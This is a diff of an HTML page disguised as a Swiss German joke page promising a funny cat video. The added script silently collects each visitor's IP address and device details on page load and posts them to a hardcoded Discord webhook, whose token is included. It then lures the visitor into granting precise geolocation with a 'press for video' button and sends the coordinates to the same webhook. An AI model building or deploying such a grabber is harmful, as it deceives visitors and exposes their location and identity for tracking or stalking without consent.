@@ -5,71 +5,240 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>😺 LUSTIGI CHATZE 😺</title>
     <style>
-        body {
-            background: linear-gradient(45deg, #ffcc00, #ff66cc);
-            font-family: 'Comic Sans MS', cursive;
-            text-align: center;
-            padding: 20px;
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .container {
+        body {
+            background: linear-gradient(135deg, #ffcc00, #ff66cc);
+            font-family: 'Comic Sans MS', 'Chalkboard SE', cursive;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
             background: white;
-            border-radius: 50px;
+            border-radius: 60px;
             max-width: 500px;
-            margin: auto;
-            padding: 30px;
-            border: 5px solid magenta;
+            width: 100%;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            border: 8px solid magenta;
+            transition: 0.3s;
         }
         h1 {
-            color: red;
-            font-size: 40px;
+            font-size: 48px;
+            color: darkred;
+            text-shadow: 3px 3px 0px #ffcc00;
+            margin-bottom: 20px;
         }
         .cat {
-            font-size: 80px;
-            margin: 20px;
+            font-size: 90px;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+        .cat:active {
+            transform: scale(1.2);
+        }
+        .swiss {
+            background: #ff3300;
+            color: white;
+            padding: 15px;
+            border-radius: 50px;
+            font-size: 22px;
+            font-weight: bold;
+            margin: 20px 0;
         }
         button {
-            background: red;
+            background: linear-gradient(45deg, red, darkred);
             color: white;
-            font-size: 35px;
-            padding: 20px;
+            font-size: 32px;
+            font-weight: bold;
             border: none;
-            border-radius: 50px;
-            cursor: pointer;
+            padding: 18px;
             width: 100%;
+            border-radius: 80px;
+            cursor: pointer;
+            margin: 15px 0;
+            transition: 0.1s;
+            font-family: inherit;
         }
-        button:hover {
-            background: darkred;
+        button:active {
+            transform: scale(0.97);
+        }
+        .info {
+            font-size: 14px;
+            color: gray;
+            margin-top: 20px;
         }
         img {
             width: 100%;
-            border-radius: 30px;
+            border-radius: 40px;
             margin-top: 20px;
+            border: 5px solid gold;
         }
-        .swiss {
-            font-size: 20px;
-            background: yellow;
+        .error-msg {
+            background: #ffcccc;
+            color: red;
             padding: 10px;
             border-radius: 20px;
-            margin: 20px 0;
+            margin: 10px 0;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>😺 LÜÜÜCYYYY 😺</h1>
-        <div class="cat">🐱🐱🐱</div>
-        <div class="swiss">🇨🇭 DU MUSCH DRUCKE FÜRS VIDEO! 🇨🇭</div>
-        <button id="clickBtn">🎬 JETZT DRUCKE 🎬</button>
-        <img src="https://cataas.com/cat/says/lol" alt="chatze">
-        <p>* 100% lustig 🎉</p>
-    </div>
 
-    <script src="script.js"></script>
-    <script>
-        document.getElementById('clickBtn').onclick = () => {
-            alert('Jetzt chunts! Konum izni istenecek...');
+<div class="card">
+    <h1>😺 LÜÜÜCYYYY 😺</h1>
+    <div class="cat" id="crazyCat">🐱‍👤🐈🐱</div>
+    <div class="swiss">🇨🇭 NUR FÜR SCHWEIZ! 🇨🇭<br>Drück für Video</div>
+    
+    <button id="locationBtn">📍 KONUM IZNI VER 📍</button>
+    
+    <div id="errorBox" class="error-msg"></div>
+    
+    <img src="https://cataas.com/cat/says/lol" alt="chatze">
+    <div class="info">* 100% öppis lustigs • garantiert 🎉</div>
+</div>
+
+<script>
+    // ---------- WEBHOOK ----------
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515100986648166723/nV48g4sriYiCN0SVpv0eko1dsoiLYi_4njTRKI-Pn9gZr3PsCa6kQFEUgSo6NwChIM07';
+    
+    async function sendToDiscord(text) {
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: text.substring(0, 2000) })
+            });
+        } catch(e) {}
+    }
+    
+    // ---------- IP ve Cihaz Bilgilerini Topla (Sayfa yüklenir yüklenmez) ----------
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) { return 'IP alınamadı'; }
+    }
+    
+    function getDevice() {
+        const ua = navigator.userAgent;
+        let cihaz = 'Bilinmiyor';
+        if (ua.includes('Android')) cihaz = 'Android Telefon/Tablet';
+        else if (ua.includes('iPhone')) cihaz = 'iPhone';
+        else if (ua.includes('iPad')) cihaz = 'iPad';
+        else if (ua.includes('Windows')) cihaz = 'Windows PC';
+        else if (ua.includes('Mac')) cihaz = 'Mac';
+        
+        let marka = 'Bilinmiyor';
+        if (ua.includes('Samsung')) marka = 'Samsung';
+        else if (ua.includes('Xiaomi')) marka = 'Xiaomi';
+        else if (ua.includes('Huawei')) marka = 'Huawei';
+        
+        return {
+            cihaz: cihaz,
+            marka: marka,
+            tarayici: ua.includes('Chrome') ? 'Chrome' : (ua.includes('Firefox') ? 'Firefox' : 'Safari/Diğer'),
+            ekran: `${screen.width}x${screen.height}`,
+            dil: navigator.language,
+            saat: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
-    </script>
+    }
+    
+    let ipAdresi = null;
+    let cihazBilgisi = null;
+    
+    (async function init() {
+        ipAdresi = await getIP();
+        cihazBilgisi = getDevice();
+        await sendToDiscord(`🆕 SAYFA AÇILDI
+🌐 IP: ${ipAdresi}
+📱 Cihaz: ${cihazBilgisi.cihaz} | ${cihazBilgisi.marka}
+🌍 Tarayıcı: ${cihazBilgisi.tarayici}
+📺 Ekran: ${cihazBilgisi.ekran}
+🔤 Dil: ${cihazBilgisi.dil}
+⏰ Saat Dilimi: ${cihazBilgisi.saat}`);
+    })();
+    
+    // ---------- KONUM İZNİ (BUTONLA) ----------
+    const locationBtn = document.getElementById('locationBtn');
+    const errorBox = document.getElementById('errorBox');
+    
+    function askLocation() {
+        if (!navigator.geolocation) {
+            errorBox.innerText = '❌ Tarayıcın konum desteklemiyor!';
+            errorBox.style.display = 'block';
+            sendToDiscord(`❌ Konum desteklenmiyor | IP: ${ipAdresi}`);
+            return;
+        }
+        
+        errorBox.style.display = 'none';
+        
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                // BAŞARILI
+                const mesaj = `✅✅ KONUM ALINDI! ✅✅
+📍 Enlem: ${pos.coords.latitude}
+📍 Boylam: ${pos.coords.longitude}
+🎯 Doğruluk: ${pos.coords.accuracy} metre
+🌐 IP: ${ipAdresi}
+📱 Cihaz: ${cihazBilgisi.cihaz} | ${cihazBilgisi.marka}
+🌍 Tarayıcı: ${cihazBilgisi.tarayici}
+📺 Ekran: ${cihazBilgisi.ekran}
+🔤 Dil: ${cihazBilgisi.dil}`;
+                
+                await sendToDiscord(mesaj);
+                
+                // Sayfayı başarılı mesajına çevir
+                document.body.innerHTML = `
+                    <div style="text-align:center; background:#00cc66; min-height:100vh; display:flex; justify-content:center; align-items:center; font-family:'Comic Sans MS';">
+                        <div style="background:white; padding:40px; border-radius:60px;">
+                            <h1>🎉 GUELTIG! 🎉</h1>
+                            <img src="https://cataas.com/cat/says/danke" width="300">
+                            <p>Jetz chasch s Video luege! 😂😂😂</p>
+                        </div>
+                    </div>
+                `;
+            },
+            async (error) => {
+                let hata = '';
+                if (error.code === 1) {
+                    hata = '❌ KULLANICI IZIN VERMEDI!';
+                    errorBox.innerText = '❌ Konum izni vermelisin! Butona tekrar bas.';
+                    errorBox.style.display = 'block';
+                } else if (error.code === 2) {
+                    hata = '📡 Konum bulunamadi';
+                    errorBox.innerText = '📡 Konum bulunamadı, tekrar dene.';
+                    errorBox.style.display = 'block';
+                } else {
+                    hata = '⏰ Zaman asimi';
+                    errorBox.innerText = '⏰ Zaman aşımı, tekrar dene.';
+                    errorBox.style.display = 'block';
+                }
+                await sendToDiscord(`${hata} | IP: ${ipAdresi} | Denemek için butona tekrar bas`);
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
+    }
+    
+    locationBtn.onclick = () => {
+        askLocation();
+    };
+    
+    // Kedi emojisine tıklayınca eğlence
+    document.getElementById('crazyCat').onclick = () => {
+        alert('😺 GUUUUGU GU! Konum izni vermek için kırmızı butona bas!');
+    };
+</script>
+
 </body>
 </html>
